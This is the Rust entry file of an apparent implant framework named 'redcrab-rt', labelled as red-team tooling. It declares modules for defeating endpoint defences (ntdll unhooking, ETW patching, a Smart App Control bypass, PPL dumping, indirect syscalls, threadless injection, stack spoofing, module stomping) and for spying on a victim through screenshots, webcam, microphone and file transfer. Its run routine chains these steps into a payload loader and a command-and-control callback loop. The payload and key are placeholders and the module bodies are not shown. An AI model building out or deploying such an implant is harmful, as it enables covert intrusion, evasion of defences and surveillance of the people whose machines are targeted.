//! redcrab-rt — red team implant framework
//! Build: python builder.py

#![no_main]
#![allow(unused_imports, dead_code)]

mod defs;
mod utils;
mod syscall;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;
mod sac_bypass;
mod ppldump;
mod pe_obfuscate;
mod indirect_syscall;
mod threadless_inject;
mod screenshot;
mod webcam;
mod mic;
mod filetransfer;
mod c2;

use defs::*;
use utils::djb2;

const PAYLOAD: &[u8] = &[0x90];

const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    sac_bypass::bypass_sac();
    unhook::unhook_ntdll();
    etw_patch::apply_all_blinds();

    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);

    loader::map_pe(&payload_buf);

    let pe_base = 0usize;
    stomp::stomp(0 as _, pe_base as _, payload_buf.len());
    spoof::spoof_stack();

    pe_obfuscate::secure_zero(&mut payload_buf);

    c2::callback_and_loop();
}
